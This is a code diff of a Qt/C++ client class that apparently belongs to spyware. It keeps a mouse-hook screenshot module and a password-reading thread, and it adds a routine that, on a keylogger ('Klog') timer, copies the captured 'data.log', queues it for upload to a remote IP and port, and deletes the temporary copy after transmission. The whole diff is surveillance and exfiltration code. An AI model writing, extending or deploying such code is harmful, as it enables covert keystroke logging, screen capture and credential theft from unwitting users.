@@ -12,7 +12,6 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     fileClient = new FileClient(this, ip, port);
     config = new Config;
     onlineTimer = new QTimer(this);
-    screenTimer = new QTimer(this);
     mutex = new QMutex();
 
     fileServer->start();
@@ -41,8 +40,7 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });
 
     //Connect screenshot module
-    connect(&MouseHook::instance(), &MouseHook::mouseClicked,
-            this, [this]()
+    connect(&MouseHook::instance(), &MouseHook::mouseClicked, [this]()
     {
         //Thread for making screenshots files
         QThread* thread = new QThread(this);
@@ -64,6 +62,13 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
             fileClient->connect();
         });
     });
+
+    //Send log by timer timeout
+    connect(&Klog::instance(), &Klog::timerIsUp, [this](){
+        enqueueLog();
+        if ( ! fileClient->isDataQueueEmpty() )
+            fileClient->connect();
+    });
 }
 
 Client::~Client()
@@ -71,7 +76,6 @@ Client::~Client()
     fileClient->getOffline();
     delete mutex;
     delete onlineTimer;
-    delete screenTimer;
     delete config;
     delete fileClient;
     delete fileServer;
@@ -147,7 +151,7 @@ void Client::getString(const QString &string, const QString& /* ip */)
                 connect(thread, &QThread::finished, thread, &QThread::deleteLater);
                 connect(thread, &QThread::finished, passReader, &PassReader::deleteLater);
 
-                //Quit thread if it was an error
+                //Quit thread if there was an error
                 connect(passReader, &PassReader::error, thread, &QThread::quit);
                 //Unlock mutex if thread finished
                 connect(thread, &QThread::finished, [this](){
@@ -177,8 +181,7 @@ void Client::getString(const QString &string, const QString& /* ip */)
 
         if (files & Log)
         {
-            fileClient->enqueueData(_FILE,  QDir::currentPath() + "/data.log");
-            //fileClient->connect();
+            enqueueLog();
         }
 
         //Look for all files in string
@@ -208,5 +211,37 @@ void Client::getNewConfig(const QString &path)
     QDir dir = path.section('/', 0, -2);
     if(dir.entryInfoList(QDir::NoDotAndDotDot|QDir::AllEntries).count() == 0)
         dir.rmdir(path.section('/', 0, -2)); //dir.name()
+}
+
+/*
+ * Copy current log to full log
+ * Enque current log to data queue
+ * Delete current log when it will be transmitted
+*/
+void Client::enqueueLog()
+{
+    QFile log("data.log");
+    log.rename("data_tmp.log");
+    QFile fullLog("fullData.log");
+
+    if ( ! (log.open(QIODevice::ReadOnly) &&
+         fullLog.open(QIODevice::Append)) )
+    {
+       qDebug() << "Can't open log files.";
+       return;
+    }
+
+    //Copy temp log to full log
+    fullLog.write(log.readAll());
+    log.close();
+    fullLog.close();
+
+    fileClient->enqueueData(_FILE,  "data_tmp.log");
+
+    //Delete temp log when it will be transmitted
+    disconnect(fileClient, &FileClient::transmitted, 0 , 0);
+    connect(fileClient, &FileClient::transmitted, [](){
+        QFile::remove("data_tmp.log");
+    });
 }
 
